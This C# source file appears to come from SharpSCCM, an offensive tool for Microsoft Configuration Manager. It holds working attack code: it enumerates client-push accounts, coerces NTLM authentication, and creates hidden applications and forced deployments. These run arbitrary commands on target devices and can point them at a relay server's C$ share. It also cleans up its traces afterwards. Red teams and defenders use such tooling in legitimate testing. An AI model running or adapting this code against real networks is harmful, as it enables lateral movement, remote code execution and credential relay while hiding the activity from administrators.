﻿using System;
using System.Data;
using System.Linq;
using System.Management;
using System.Threading;
using System.Xml.Linq;

namespace SharpSCCM
{
    public static class MgmtPointWmi
    {
        public static void GenerateCCR(string target, string server = null, string siteCode = null)
        {
            ManagementScope wmiConnection = MgmtUtil.NewWmiConnection(server, null, siteCode);
            Console.WriteLine($"[+] Generating a client configuration request (CCR) to coerce authentication to {target}");
            ManagementClass collectionClass = new ManagementClass(wmiConnection, new ManagementPath("SMS_Collection"), null);
            ManagementBaseObject generatorParams = collectionClass.GetMethodParameters("GenerateCCRByName");
            generatorParams.SetPropertyValue("Name", target);
            generatorParams.SetPropertyValue("PushSiteCode", siteCode);
            generatorParams.SetPropertyValue("Forced", false);
            collectionClass.InvokeMethod("GenerateCCRByName", generatorParams, null);
        }

        public static ManagementObjectCollection GetCollection(ManagementScope scope, string collectionName = null, string collectionId = null, string[] properties = null, bool dryRun = false, bool verbose = false, bool printOutput = true)
        {
            ManagementObjectCollection collections;
            ManagementObjectSearcher searcher;
            // Get CollectionID from name
            if (!string.IsNullOrEmpty(collectionId))
            {
                searcher = new ManagementObjectSearcher(scope, new ObjectQuery($"SELECT * FROM SMS_Collection WHERE CollectionID='{collectionId}'"));
            }
            else
            {
                searcher = new ManagementObjectSearcher(scope, new ObjectQuery($"SELECT * FROM SMS_Collection WHERE Name='{collectionName}'"));
            }
            collections = searcher.Get();
            if (collections.Count > 1)
            {
                Console.WriteLine("[!] Found more than one instance of the specified collection name");
                Console.WriteLine("[!] Try using its CollectionID instead (-i)");
            }
            else if (collections.Count == 0)
            {
                Console.WriteLine("[+] Found 0 collections matching the specified Name or CollectionID");
            }
            return collections;
        }

        public static ManagementObjectCollection GetCollectionMember(ManagementScope scope, string collectionName = null, string collectionId = null, string[] properties = null, bool dryRun = false, bool verbose = false, bool printOutput = true)
        {
            ManagementObjectCollection collectionMembers = null;
            ManagementObjectCollection collections = GetCollection(scope, collectionName, collectionId, properties, dryRun, verbose, printOutput);
            if (collections.Count == 1)
            {
                foreach (ManagementObject collection in collections)
                {
                    collectionMembers = MgmtUtil.GetClassInstances(scope, "SMS_CollectionMember_a", null, false, properties, $"CollectionID='{collection.GetPropertyValue("CollectionID")}'", null, dryRun, verbose, printOutput: printOutput);
                    if (collectionMembers.Count == 0)
                    {
                        Console.WriteLine(value: "[+] Found 0 members in the specified collection");
                    }
                }
            }
            return collectionMembers;
        }

        public static void GetCollectionRule(ManagementScope scope, string collectionName, string collectionId, string deviceName, string userName, string resourceId)
        {
            bool foundMatchingRule = false;
            ManagementObjectCollection collections;
            if (!string.IsNullOrEmpty(collectionId))
            {
                collections = MgmtUtil.GetClassInstances(scope, "SMS_Collection", $"SELECT * FROM SMS_Collection WHERE CollectionID='{collectionId}'");
            }
            else if (!string.IsNullOrEmpty(collectionName))
            {
                collections = MgmtUtil.GetClassInstances(scope, "SMS_Collection", $"SELECT * FROM SMS_Collection WHERE Name='{collectionName}'");
            }
            else
            {
                collections = MgmtUtil.GetClassInstances(scope, "SMS_Collection", "SELECT * FROM SMS_Collection");
            }
            // Get rules for all collections if a collection Name or CollectionID was not specified
            if ((!string.IsNullOrEmpty(collectionId) || !string.IsNullOrEmpty(collectionName)) && collections.Count == 1 || (string.IsNullOrEmpty(collectionName) && string.IsNullOrEmpty(collectionId)))
            {
                Console.WriteLine("[+] Searching for matching collection rules");
                foreach (ManagementObject collection in collections)
                {
                    // Get the CollectionID to for the rule
                    collectionId = (string)collection["CollectionID"];
                    
                    // Fetch CollectionRules lazy property
                    collection.Get();

                    ManagementBaseObject[] collectionRules = (ManagementBaseObject[])collection["CollectionRules"];
                    foreach (ManagementBaseObject collectionRule in collectionRules)
                    {
                        // Grab the query and fetch the results
                        string collectionRuleQuery = (string)collectionRule["QueryExpression"];
                        ManagementObjectCollection collectionRuleQueryResults = MgmtUtil.GetClassInstances(scope, "Query Results", collectionRuleQuery);
                        if (collectionRuleQueryResults.Count > 0)
                        {
                            foreach (ManagementObject collectionRuleQueryResult in collectionRuleQueryResults)
                            {
                                // If device Name, user UniqueUserName, or ResourceID provided, or if only a collection Name or CollectionID is provided, print matching or all collection rules, respectively
                                try
                                {
                                    if ((!string.IsNullOrEmpty(collectionName) || !string.IsNullOrEmpty(collectionId)) && string.IsNullOrEmpty(deviceName) && string.IsNullOrEmpty(userName) && string.IsNullOrEmpty(resourceId) ||
                                    (string)collectionRuleQueryResult.GetPropertyValue("Name") == deviceName ||
                                    (string)collectionRuleQueryResult.GetPropertyValue("UniqueUserName") == userName ||
                                    (uint)collectionRuleQueryResult.GetPropertyValue("ResourceID") == Convert.ToUInt32(resourceId))
                                    {
                                        foundMatchingRule = true;
                                        Console.WriteLine("-----------------------------------\n" +
                                            $"CollectionID: {collectionId}\n" +
                                            $"Collection Name: {collection["Name"]}\n" +
                                            $"QueryID: {collectionRule["QueryID"]}\n" +
                                            $"RuleName: {collectionRule["RuleName"]}\n" +
                                            $"Query Expression:{collectionRule["QueryExpression"]}");
                                    }
                                }
                                catch (ManagementException)
                                {
                                    // Keep going if the property isn't found because the column names don't exist in both SMS_R_System or SMS_R_User
                                }
                            }
                        }
                    }
                }
                if (foundMatchingRule)
                {
                    Console.WriteLine("-----------------------------------");
                }
                else
                {
                    Console.WriteLine("[+] Found 0 matching collection membership rules");
                }
            }
            else if (collections.Count > 1)
            {
                Console.WriteLine("[!] Found more than one instance of the specified collection");
                Console.WriteLine("[!] Try using its CollectionID instead (-i)");
            }
            else
            {
                Console.WriteLine("[+] Found 0 matching collections");
            }
        }

        public static void GetSitePushSettings(ManagementScope wmiConnection = null)
        {
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(wmiConnection, new ObjectQuery($"SELECT PropertyName, Value, Value1 FROM SMS_SCI_SCProperty WHERE ItemType='SMS_DISCOVERY_DATA_MANAGER' AND (PropertyName='ENABLEKERBEROSCHECK' OR PropertyName='FILTERS' OR PropertyName='SETTINGS')"));
            try
            {
                ManagementObjectCollection results = searcher.Get();
                if (results.Count > 0)
                {
                    foreach (ManagementObject result in results)
                    {
                        if (result["PropertyName"].ToString() == "SETTINGS" && result["Value1"].ToString() == "Active")
                        {
                            Console.WriteLine("[+] Automatic site-wide client push installation is enabled");
                        }
                        else if (result["PropertyName"].ToString() == "SETTINGS" && result["Value1"].ToString() != "Active")
                        {
                            Console.WriteLine("[+] Automatic site-wide client push installation is not enabled");
                        }
                        else if (result["PropertyName"].ToString() == "ENABLEKERBEROSCHECK" && result["Value"].ToString() == "3")
                        {
                            Console.WriteLine("[+] Fallback to NTLM is enabled");
                        }
                        else if (result["PropertyName"].ToString() == "FILTERS")
                        {
                            Console.WriteLine("[+] Install client software on the following computers:");
                            if (result["Value"].ToString() == "0")
                            {
                                Console.WriteLine("      Workstations and Servers (including domain controllers)");
                            }
                            else if (result["Value"].ToString() == "1")
                            {
                                Console.WriteLine("      Servers only (including domain controllers)");
                            }
                            else if (result["Value"].ToString() == "2")
                            {
                                Console.WriteLine("      Workstations and Servers (excluding domain controllers)");
                            }
                            else if (result["Value"].ToString() == "3")
                            {
                                Console.WriteLine("      Servers only (excluding domain controllers)");
                            }
                            else if (result["Value"].ToString() == "4")
                            {
                                Console.WriteLine("      Workstations and domain controllers only (excluding other servers)");
                            }
                            else if (result["Value"].ToString() == "5")
                            {
                                Console.WriteLine("      Domain controllers only");
                            }
                            else if (result["Value"].ToString() == "6")
                            {
                                Console.WriteLine("      Workstations only");
                            }
                            else if (result["Value"].ToString() == "7")
                            {
                                Console.WriteLine("      No computers");
                            }
                        }
                    }
                    searcher = new ManagementObjectSearcher(wmiConnection, new ObjectQuery("SELECT Values FROM SMS_SCI_SCPropertyList WHERE PropertyListName='Reserved2'"));
                    results = searcher.Get();
                    foreach (ManagementObject result in results)
                    {
                        if (result["Values"] != null)
                        {
                            foreach (string value in (string[])result["Values"])
                            {
                                Console.WriteLine($"[+] Discovered client push installation account: {value}");

                            }
                        }
                        else
                        {
                            Console.WriteLine("[+] No client push installation accounts were configured, but the server may still use its machine account");
                        }
                    }
                    searcher = new ManagementObjectSearcher(wmiConnection, new ObjectQuery("SELECT * FROM SMS_SCI_SQLTask WHERE ItemName='Clear Undiscovered Clients'"));
                    results = searcher.Get();
                    foreach (ManagementObject result in results)
                    {
                        if (result["Enabled"].ToString() == "True")
                        {
                            Console.WriteLine($"[+] The client installed flag is automatically cleared on inactive clients after {result["DeleteOlderThan"]} days, resulting in reinstallation if automatic site-wide client push installation is enabled");
                        }
                        else
                        {
                            Console.WriteLine("[+] The client installed flag is not automatically cleared on inactive clients, preventing automatic reinstallation");
                        }
                    }
                }
            }
            catch (UnauthorizedAccessException ex)
            {
                Console.WriteLine($"[!] You do not have the necessary permissions to query the WMI provider: {ex.Message}");
            }
            catch (ManagementException ex)
            {
                Console.WriteLine($"[!] An exception occurred while querying for WMI data: {ex.Message}");
            }
        }

        public static void Exec (ManagementScope scope, string deviceName = null, string collectionName = null, string path = null, string relayServer = null, bool runAsUser = true)
        {
            string newCollectionName = $"Devices_{Guid.NewGuid().ToString()}";
            string newApplicationName = $"Application_{Guid.NewGuid().ToString()}";
            NewCollection(scope, "device", newCollectionName);
            NewCollectionMember(scope, newCollectionName, null, null, deviceName);
            if (!String.IsNullOrEmpty(relayServer))
            {
                NewApplication(scope, newApplicationName, $"\\\\{relayServer}\\C$", runAsUser, true);
            }
            else
            {
                NewApplication(scope, newApplicationName, $"{path}", runAsUser, true);
            }
            NewDeployment(scope, newApplicationName, newCollectionName);
            Console.WriteLine("[+] Waiting 30s for new deployment to become available");
            System.Threading.Thread.Sleep(30000);
            InvokeUpdate(scope, newCollectionName);
            Console.WriteLine("[+] Waiting 1m for NTLM authentication");
            System.Threading.Thread.Sleep(60000);
            Console.WriteLine("[+] Cleaning up");
            Cleanup.RemoveDeployment(scope, $"{newApplicationName}_{newCollectionName}_Install");
            Cleanup.RemoveApplication(scope, newApplicationName);
            Cleanup.RemoveCollection(scope, newCollectionName);
        }
        
        public static void InvokeLastLogonUpdate(ManagementScope scope, string collectionName)
        {
            // TODO
        }

        public static void InvokeUpdate(ManagementScope scope, string collectionName)
        {
            Console.WriteLine($"[+] Forcing all members of {collectionName} to check for updates and execute any new applications available");
            ManagementClass clientOperation = new ManagementClass(scope, new ManagementPath("SMS_ClientOperation"), null);
            ManagementBaseObject initiateClientOpParams = clientOperation.GetMethodParameters("InitiateClientOperation");
            initiateClientOpParams.SetPropertyValue("Type", 8); // RequestPolicyNow

            ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, new ObjectQuery($"SELECT * FROM SMS_Collection WHERE Name='{collectionName}'"));
            foreach (ManagementObject collection in searcher.Get())
            {
                initiateClientOpParams["TargetCollectionID"] = collection.GetPropertyValue("CollectionID");
            }
            try
            {
                clientOperation.InvokeMethod("InitiateClientOperation", initiateClientOpParams, null);
            }
            catch (ManagementException ex)
            {
                Console.WriteLine($"[!] An exception occurred while attempting to commit the changes: {ex.Message}");
                Console.WriteLine("[!] Is your account assigned the correct security role?");
            }
        }

        public static void NewApplication(ManagementScope scope, string name, string path, bool runAsUser = false, bool stealth = false)
        {
            // Check for existing application before creating a new one
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, new ObjectQuery($"SELECT * FROM SMS_Application WHERE LocalizedDisplayName='{name}'"));
            ManagementObjectCollection applications = searcher.Get();
            if (applications.Count > 0)
            {
                foreach (ManagementObject application in applications)
                {
                    Console.WriteLine($"[+] There is already an application with the name {name}");
                }
            }
            else
            {
                Console.WriteLine($"[+] Creating new application: {name}");
                ManagementClass idInstance = new ManagementClass(scope, new ManagementPath("SMS_Identification"), null);
                ManagementBaseObject outParams = idInstance.InvokeMethod("GetSiteID", null, null);
                string siteId = outParams["SiteID"].ToString().Replace("{", "").Replace("}", "");
                string scopeId = $"ScopeId_{siteId}";
                string appId = $"Application_{Guid.NewGuid()}";
                string deploymentId = $"DeploymentType_{Guid.NewGuid()}";
                string fileId = $"File_{Guid.NewGuid()}";
                string xml = $@"<?xml version=""1.0"" encoding=""utf-16""?>
                <AppMgmtDigest xmlns=""http://schemas.microsoft.com/SystemCenterConfigurationManager/2009/AppMgmtDigest"" xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"">
                    <Application AuthoringScopeId=""{scopeId}"" LogicalName=""{appId}"" Version=""1"">
                        <DisplayInfo DefaultLanguage=""en-US"">
                            <Info Language=""en-US"">
                                <Title>{name}</Title>
                                <Publisher/>
                                <Version/>
                            </Info>
                        </DisplayInfo>
                        <DeploymentTypes>
                            <DeploymentType AuthoringScopeId=""{scopeId}"" LogicalName=""{deploymentId}"" Version=""1""/>
                        </DeploymentTypes>
                        <Title ResourceId=""Res_665624387"">{name}</Title>
                        <Description ResourceId=""Res_215018014""/>
                        <Publisher ResourceId=""Res_433133800""/>
                        <SoftwareVersion ResourceId=""Res_486536226""/>
                        <CustomId ResourceId=""Res_167409166""/>
                    </Application>
                    <DeploymentType AuthoringScopeId=""{scopeId}"" LogicalName=""{deploymentId}"" Version=""1"">
                        <Title ResourceId=""Res_1643586251"">{name}</Title>
                        <Description ResourceId=""Res_1438196005""/>
                        <DeploymentTechnology>GLOBAL/ScriptDeploymentTechnology</DeploymentTechnology>
                        <Technology>Script</Technology>
                        <Hosting>Native</Hosting>
                        <Installer Technology=""Script"">
                            <ExecutionContext>{(runAsUser ? "User" : "System")}</ExecutionContext>
                            <DetectAction>
                                <Provider>Local</Provider>
                                <Args>
                                    <Arg Name=""ExecutionContext"" Type=""String"">{(runAsUser ? "User" : "System")}</Arg>
                                    <Arg Name=""MethodBody"" Type=""String"">
                                        &lt;?xml version=""1.0"" encoding=""utf-16""?&gt;                                                                                       
                                            &lt;EnhancedDetectionMethod xmlns=""http://schemas.microsoft.com/SystemCenterConfigurationManager/2009/AppMgmtDigest""&gt;
                                                &lt;Settings xmlns=""http://schemas.microsoft.com/SystemCenterConfigurationManager/2009/AppMgmtDigest""&gt;
                                                    &lt;File Is64Bit=""true"" LogicalName=""{fileId}"" xmlns=""http://schemas.microsoft.com/SystemsCenterConfigurationManager/2009/07/10/DesiredConfiguration""&gt;
                                                        &lt;Annotation xmlns=""http://schemas.microsoft.com/SystemsCenterConfigurationManager/2009/06/14/Rules""&gt;
                                                            &lt;DisplayName Text="""" /&gt;
                                                            &lt;Description Text="""" /&gt;
                                                        &lt;/Annotation&gt;
                                                        &lt;Path&gt;C:\&lt;/Path&gt;
                                                        &lt;Filter&gt;asdf&lt;/Filter&gt;
                                                    &lt;/File&gt;
                                                &lt;/Settings&gt;
                                                &lt;Rule id=""{scopeId}/{deploymentId}"" Severity=""Informational"" NonCompliantWhenSettingIsNotFound=""false"" xmlns=""http://schemas.microsoft.com/SystemsCenterConfigurationManager/2009/06/14/Rules""&gt;
                                                    &lt;Annotation&gt;
                                                        &lt;DisplayName Text="""" /&gt;
                                                        &lt;Description Text="""" /&gt;
                                                    &lt;/Annotation&gt;
                                                    &lt;Expression&gt;
                                                        &lt;Operator&gt;NotEquals&lt;/Operator&gt;
                                                        &lt;Operands&gt;
                                                            &lt;SettingReference AuthoringScopeId=""{scopeId}"" LogicalName=""{appId}"" Version=""1"" DataType=""Int64"" SettingLogicalName=""{fileId}"" SettingSourceType=""File"" Method=""Count"" Changeable=""false"" /&gt;
                                                            &lt;ConstantValue Value=""0"" DataType=""Int64"" /&gt;
                                                        &lt;/Operands&gt;
                                                    &lt;/Expression&gt;
                                                &lt;/Rule&gt;
                                            &lt;/EnhancedDetectionMethod&gt;
                                    </Arg>
                                </Args>
                            </DetectAction>
                            <InstallAction>
                                <Provider>Script</Provider>
                                <Args>
                                    <Arg Name=""InstallCommandLine"" Type=""String"">{path}</Arg>
                                    <Arg Name=""WorkingDirectory"" Type=""String""/>
                                    <Arg Name=""ExecutionContext"" Type=""String"">{(runAsUser ? "User" : "System")}</Arg>
                                    <Arg Name=""RequiresLogOn"" Type=""String""/>
                                    <Arg Name=""RequiresElevatedRights"" Type=""Boolean"">false</Arg>
                                    <Arg Name=""RequiresUserInteraction"" Type=""Boolean"">false</Arg>
                                    <Arg Name=""RequiresReboot"" Type=""Boolean"">false</Arg>
                                    <Arg Name=""UserInteractionMode"" Type=""String"">Hidden</Arg>
                                    <Arg Name=""PostInstallBehavior"" Type=""String"">BasedOnExitCode</Arg>
                                    <Arg Name=""ExecuteTime"" Type=""Int32"">0</Arg><Arg Name=""MaxExecuteTime"" Type=""Int32"">15</Arg>
                                    <Arg Name=""RunAs32Bit"" Type=""Boolean"">false</Arg>
                                    <Arg Name=""SuccessExitCodes"" Type=""Int32[]"">
                                        <Item>0</Item>
                                        <Item>1707</Item>
                                    </Arg>
                                    <Arg Name=""RebootExitCodes"" Type=""Int32[]"">
                                        <Item>3010</Item>
                                    </Arg>
                                    <Arg Name=""HardRebootExitCodes"" Type=""Int32[]"">
                                        <Item>1641</Item>
                                    </Arg>
                                    <Arg Name=""FastRetryExitCodes"" Type=""Int32[]"">
                                        <Item>1618</Item>
                                    </Arg>
                                </Args>
                            </InstallAction>
                            <CustomData>
                                <DetectionMethod>Enhanced</DetectionMethod>
                                <EnhancedDetectionMethod>
                                    <Settings xmlns=""http://schemas.microsoft.com/SystemCenterConfigurationManager/2009/AppMgmtDigest"">
                                        <File xmlns=""http://schemas.microsoft.com/SystemsCenterConfigurationManager/2009/07/10/DesiredConfiguration"" Is64Bit=""true"" LogicalName=""{fileId}"">
                                            <Annotation xmlns=""http://schemas.microsoft.com/SystemsCenterConfigurationManager/2009/06/14/Rules"">
                                                <DisplayName Text=""""/>
                                                <Description Text=""""/>
                                            </Annotation>
                                            <Path>C:\</Path>
                                            <Filter>asdf</Filter>
                                        </File>
                                    </Settings>
                                    <Rule xmlns=""http://schemas.microsoft.com/SystemsCenterConfigurationManager/2009/06/14/Rules"" id=""{scope}/{deploymentId}"" Severity=""Informational"" NonCompliantWhenSettingIsNotFound=""false"">
                                        <Annotation>
                                            <DisplayName Text=""""/><Description Text=""""/>
                                        </Annotation>
                                        <Expression>
                                            <Operator>NotEquals</Operator>
                                            <Operands>
                                                <SettingReference AuthoringScopeId=""{scopeId}"" LogicalName=""{appId}"" Version=""1"" DataType=""Int64"" SettingLogicalName=""{fileId}"" SettingSourceType=""File"" Method=""Count"" Changeable=""false""/>
                                                <ConstantValue Value=""0"" DataType=""Int64""/>
                                            </Operands>
                                        </Expression>
                                    </Rule>
                                </EnhancedDetectionMethod>
                                <InstallCommandLine>{path}</InstallCommandLine>
                                <UninstallSetting>SameAsInstall</UninstallSetting>
                                <InstallFolder/>
                                <UninstallCommandLine/>
                                <UninstallFolder/>
                                <MaxExecuteTime>15</MaxExecuteTime>
                                <ExitCodes>
                                    <ExitCode Code=""0"" Class=""Success""/>
                                    <ExitCode Code=""1707"" Class=""Success""/>
                                    <ExitCode Code=""3010"" Class=""SoftReboot""/>
                                    <ExitCode Code=""1641"" Class=""HardReboot""/>
                                    <ExitCode Code=""1618"" Class=""FastRetry""/>
                                </ExitCodes>
                                <UserInteractionMode>Hidden</UserInteractionMode>
                                <AllowUninstall>true</AllowUninstall>
                            </CustomData>
                        </Installer>
                    </DeploymentType>
                </AppMgmtDigest>
                ";

                //
                // XML with assistance from Config Manager SDK
                //Application appInstance = SccmSerializer.DeserializeFromString(xml, true);
                //string xmla = SccmSerializer.SerializeToString(appInstance, true);

                ManagementObject application = new ManagementClass(scope, new ManagementPath("SMS_Application"), null).CreateInstance();
                //application["SDMPackageXML"] = xmla;
                application["SDMPackageXML"] = xml;
                if (stealth)
                {
                    application["IsHidden"] = true;
                    Console.WriteLine("[+] Updated application to hide it from the Configuration Manager console");
                }
                if (runAsUser)
                {
                    Console.WriteLine("[+] Updated application to run in the context of the logged on user");
                }
                try
                {
                    application.Put();
                    ManagementObjectCollection createdApplications = MgmtUtil.GetClassInstances(scope, "SMS_Application", null, false, null, $"LocalizedDisplayName='{name}'");
                    if (createdApplications.Count > 0)
                    {
                        Console.WriteLine("[+] Successfully created application");
                    }
                    else
                    {
                        Console.WriteLine("[!] The application was not found after creation");
                    }
                }
                catch (ManagementException ex)
                {
                    Console.WriteLine($"[!] An exception occurred while attempting to commit the changes: {ex.Message}");
                    Console.WriteLine("[!] Is your account assigned the correct security role?");
                }
            }
        }

        public static ManagementObject NewCollection(ManagementScope scope, string collectionType, string collectionName)
        {
            ManagementObject returnedCollection = null;
            Console.WriteLine($"[+] Creating new {collectionType} collection: {collectionName}");
            ManagementObject collection = new ManagementClass(scope, new ManagementPath("SMS_Collection"), null).CreateInstance();
            collection["Name"] = collectionName;
            collection["OwnedByThisSite"] = true;
            if (collectionType == "device")
            {
                collection["CollectionType"] = "2";
                collection["LimitToCollectionId"] = "SMS00001";
            }
            else if (collectionType == "user")
            {
                collection["CollectionType"] = "1";
                collection["LimitToCollectionId"] = "SMS00002";
            }
            try
            {
                collection.Put();
                ManagementObjectCollection createdCollections = MgmtUtil.GetClassInstances(scope, "SMS_Collection", null, false, null, $"Name='{collectionName}'");
                if (createdCollections.Count == 1)
                {
                    Console.WriteLine("[+] Successfully created collection");
                    foreach (ManagementObject createdCollection in createdCollections)
                    {
                        return createdCollection;
                    }
                }
                else if (createdCollections.Count > 1)
                {
                    Console.WriteLine($"[!] Found more than one instance of a collection named {collectionName}");
                }
                else
                {
                    Console.WriteLine("[!] The collection was not found after creation");
                }
            }
            catch (ManagementException ex)
            {
                Console.WriteLine($"[!] An exception occurred while attempting to commit the changes: {ex.Message}");
                Console.WriteLine("[!] Is your account assigned the correct security role?");
            }
            return returnedCollection;
        }

        public static ManagementObjectCollection NewCollectionMember(ManagementScope scope, string collectionName = null, string collectionType = null, string collectionId = null, string deviceName = null, string userName = null, string resourceId = null, int waitTime = 15)
        {
            ManagementObjectCollection collectionMembers = null;

            // Use the provided collection type or set to device/user depending on which was provided
            collectionType = !string.IsNullOrEmpty(deviceName) ? "device" : !string.IsNullOrEmpty(userName) ? "user" : collectionType;

            // Make sure the specified collection exists
            ManagementObjectCollection collections = GetCollection(scope, collectionName, collectionId);
            if (collections.Count == 1)
            {
                // Check if the resource is already a member of the collection
                ManagementObjectCollection existingMembers = GetCollectionMember(scope, collectionName, collectionId, printOutput: false);
                if (existingMembers.Count > 0)
                {
                    foreach (ManagementObject existingMember in existingMembers)
                    {
                        if (!string.IsNullOrEmpty(deviceName) && (string)existingMember.GetPropertyValue("Name") == deviceName)
                        {
                            Console.WriteLine($"[!] A device named {deviceName} is already a member of the collection");
                        }
                        else if (!string.IsNullOrEmpty(userName) && existingMember.GetPropertyValue("Name").ToString().Contains(userName))
                        {
                            Console.WriteLine($"[!] A user named {existingMember.GetPropertyValue("Name")} is already a member of the collection");
                        }
                        else if (!string.IsNullOrEmpty(resourceId) && (uint)existingMember.GetPropertyValue("ResourceID") == Convert.ToUInt32(resourceId))
                        {
                            Console.WriteLine($"[!] A resource with ID {resourceId} is already a member of the collection");
                        }
                    }
                    return null;
                }
                // Make sure the specified resource exists
                string membershipQuery = null;
                ManagementObjectCollection matchingResources = null;
                if (!string.IsNullOrEmpty(resourceId))
                {
                    membershipQuery = $"SELECT * FROM SMS_R_{(collectionType == "device" ? "System" : "User")} WHERE ResourceID='{resourceId}'";
                    matchingResources = MgmtUtil.GetClassInstances(scope, $"SMS_R_{(collectionType == "device" ? "System" : "User")}", membershipQuery);

                }
                else if (!string.IsNullOrEmpty(deviceName))
                {
                    membershipQuery = $"SELECT * FROM SMS_R_System WHERE Name='{deviceName}'";
                    matchingResources = MgmtUtil.GetClassInstances(scope, "SMS_R_System", membershipQuery);
                }
                else if (!string.IsNullOrEmpty(userName))
                {
                    membershipQuery = $"SELECT * FROM SMS_R_User WHERE UniqueUserName='{userName}'";
                    matchingResources = MgmtUtil.GetClassInstances(scope, "SMS_R_User", membershipQuery);
                }
                if (matchingResources.Count > 1)
                {
                    Console.WriteLine("[!] Found more than one instance of the specified resource");
                    Console.WriteLine("[!] Try using its ResourceID instead (-r)");
                }
                else if (matchingResources.Count > 0)
                {
                    Console.WriteLine($"[+] Verified resource exists");
                    ManagementObject newCollectionRule = new ManagementClass(scope, new ManagementPath("SMS_CollectionRuleQuery"), null).CreateInstance();
                    newCollectionRule["QueryExpression"] = membershipQuery;
                    newCollectionRule["RuleName"] = $"{collectionType}_{Guid.NewGuid()}";
                    foreach (ManagementObject collection in collections)
                    {
                        ManagementBaseObject addMembershipRuleParams = collection.GetMethodParameters("AddMembershipRule");
                        addMembershipRuleParams.SetPropertyValue("collectionRule", newCollectionRule);
                        if ((uint)collection.Properties[propertyName: "CollectionType"].Value == 1 && collectionType == "device")
                        {
                            Console.WriteLine("[!] Can't add a device to a user collection");
                        }
                        else if ((uint)collection.Properties["CollectionType"].Value == 2 && collectionType == "user")
                        {
                            Console.WriteLine("[!] Can't add a user to a device collection");

                        }
                        else
                        {
                            try
                            {
                                collection.InvokeMethod("AddMembershipRule", addMembershipRuleParams, null);
                                Console.WriteLine($"[+] Added resource to {(!string.IsNullOrEmpty(collectionName) ? collectionName : collectionId)}");
                                Console.WriteLine($"[+] Waiting {waitTime}s for collection to populate");
                                Thread.Sleep(waitTime * 1000);
                                collectionMembers = GetCollectionMember(scope, collectionName, collectionId);
                            }
                            catch (ManagementException ex)
                            {
                                Console.WriteLine($"[!] An exception occurred while attempting to commit the changes: {ex.Message}");
                                Console.WriteLine("[!] Is your account assigned the correct security role?");
                            }
                        }
                    }
                }
                else
                {
                    Console.WriteLine($"[!] Could not find the specified device or user");
                }
            }
            return collectionMembers;
        }

        public static void NewDeployment(ManagementScope scope, string application, string collection)
        {
            // Check for existing deployment before creating a new one
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, new ObjectQuery($"SELECT * FROM SMS_ApplicationAssignment WHERE ApplicationName='{application}' AND CollectionName='{collection}'"));
            ManagementObjectCollection deployments = searcher.Get();
            if (deployments.Count > 0)
            {
                foreach (ManagementObject deployed in deployments)
                {
                    Console.WriteLine($"[+] {application} already deployed to {collection}");
                }
            }
            else
            {
                Console.WriteLine($"[+] Creating new deployment of {application} to {collection}");
                string siteCode = scope.Path.ToString().Split('_').Last();
                string now = DateTime.Now.ToString("yyyyMMddHHmmss" + ".000000+***");
                ManagementObject deployment = new ManagementClass(scope, new ManagementPath("SMS_ApplicationAssignment"), null).CreateInstance();
                deployment["ApplicationName"] = application;
                deployment["AssignmentName"] = $"{application}_{collection}_Install";
                deployment["AssignmentAction"] = 2; // APPLY
                deployment["AssignmentType"] = 2; // Application
                deployment["CollectionName"] = collection;
                deployment["DesiredConfigType"] = 1; // REQUIRED
                deployment["DisableMOMAlerts"] = true;
                deployment["EnforcementDeadline"] = now;
                deployment["LogComplianceToWinEvent"] = false;
                deployment["NotifyUser"] = false;
                deployment["OfferTypeID"] = 0; // REQUIRED
                deployment["OverrideServiceWindows"] = true;
                deployment["Priority"] = 2; // HIGH
                deployment["RebootOutsideOfServiceWindows"] = false;
                deployment["SoftDeadlineEnabled"] = true;
                deployment["SourceSite"] = siteCode;
                deployment["StartTime"] = now;
                deployment["SuppressReboot"] = 0;
                deployment["UseGMTTimes"] = true;
                deployment["UserUIExperience"] = false; // Do not display user notifications
                deployment["WoLEnabled"] = false; // Not including this one results in errors displayed in the console

                searcher = new ManagementObjectSearcher(scope, new ObjectQuery($"SELECT * FROM SMS_Application WHERE LocalizedDisplayName='{application}'"));
                ManagementObjectCollection applications = searcher.Get();
                Console.WriteLine($"[+] Found {applications.Count} applications named {application}");
                if (applications.Count > 0)
                {
                    foreach (ManagementObject applicationObj in applications)
                    {
                        deployment["AssignedCIs"] = new Int32[] { Convert.ToInt32(applicationObj.Properties["CI_ID"].Value) };
                    }
                }

                searcher = new ManagementObjectSearcher(scope, new ObjectQuery($"SELECT * FROM SMS_Collection WHERE Name='{collection}'"));
                ManagementObjectCollection collections = searcher.Get();
                Console.WriteLine($"[+] Found {collections.Count} collections named {collection}");
                if (collections.Count > 0)
                {
                    foreach (ManagementObject collectionObj in collections)
                    {
                        deployment["TargetCollectionID"] = collectionObj.GetPropertyValue("CollectionID");
                    }
                }
                try
                {
                    deployment.Put();
                    ManagementObjectCollection createdDeployments = MgmtUtil.GetClassInstances(scope, "SMS_ApplicationAssignment", null, false, null, $"ApplicationName='{application}' AND CollectionName='{collection}'");
                    if (createdDeployments.Count > 0)
                    {
                        Console.WriteLine("[+] Successfully created deployment");
                    }
                    else
                    {
                        Console.WriteLine("[!] The deployment was not found after creation");
                    }
                }
                catch (ManagementException ex)
                {
                    Console.WriteLine($"[!] An exception occurred while attempting to commit the changes: {ex.Message}");
                    Console.WriteLine("[!] Is your account assigned the correct security role?");
                }
            }
        }
    }
}